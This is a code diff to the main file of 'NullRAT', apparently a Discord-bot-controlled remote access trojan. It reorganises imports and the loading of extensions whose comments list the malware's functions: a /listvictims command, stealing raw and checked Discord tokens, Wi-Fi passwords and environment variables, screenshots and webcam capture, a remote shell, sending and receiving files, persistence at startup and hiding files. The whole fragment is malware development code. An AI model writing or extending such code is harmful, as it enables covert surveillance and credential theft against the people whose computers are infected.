@@ -4,11 +4,8 @@ import disnake as discord
 from disnake import Embed
 from disnake.ext import commands
 
-from mss import mss
-from datetime import datetime
 from socket import create_connection
-from base64 import decodebytes, b64decode
-import os, subprocess, re, time, aiohttp, requests
+import os, re, aiohttp, requests
 
 ###################################################################
 def IP():
@@ -107,31 +104,10 @@ async def on_ready():
     ).set_footer(
         text = f"Startup time:"
     )
-    await client.get_channel(notification_channel).send(embed=embed)
-
-###################################################################
-    
-extensions = (
-    "sendfiles",
-    "receivefiles",
-    "getenv",
-    "rawtokens",
-    "checkedtokens",
-    "geolocate",
-    "systeminfo",
-    "screenshot",
-    "startup",
-    "shell",
-    "wifi",
-    "hide",
-    "directory",
-    "getwebcam"
-)
-
-for ex in extensions:
-    client.load_extension("modules."+ex)
+    await client.get_channel(notification_channel).send(embed=embed)    
 
 ############### Basic commands 
+
 @client.slash_command(description="Finds the values of environment variables" )
 async def listvictims(ctx):
     await ctx.channel.send( 
@@ -150,8 +126,8 @@ async def close(ctx, victim):
 @client.slash_command(description="Quits all instances of NullRAT")
 async def close_all(ctx):
     await ctx.response.send_message("Are you sure?", view=closeall_confirm())
-############### Basic commands 
-
+    
+############### Closing class 
 
 class closeall_confirm(discord.ui.View):
     @discord.ui.button(label="Yes", style=discord.ButtonStyle.danger)
@@ -169,7 +145,28 @@ class closeall_confirm(discord.ui.View):
         await interaction.response.edit_message(view=self) 
         await interaction.channel.send(embed=Embed(title="Aborted shut-down"))   
         
-        
+############### Bot Extensions
+
+extensions = (
+    "hide",           # /hidefile & /unhidefile
+    "wifi",           # /wifilist & /wifipass
+    "shell",          # /shell
+    "getenv",         # /get_environment
+    "webcam",         # /get_webcam
+    "startup",        # /startup
+    "geolocate",      # /get_geolocation
+    "directory",      # /get_currentdir & /change_directory & /list_directory
+    "rawtokens",      # /raw_tokens & /raw_discord
+    "sendfiles",      # /sendfiles
+    "systeminfo",     # /get_systeminfo
+    "screenshot",     # /get_screenshot
+    "receivefiles",   # /receivefiles
+    "checkedtokens"   # /checked_tokens & /checked_discord
+)
+
+for ex in extensions:
+    client.load_extension("modules."+ex)
+
 ############### Bot Startup
 def is_connected():
     try: create_connection(("1.1.1.1", 53)); return True
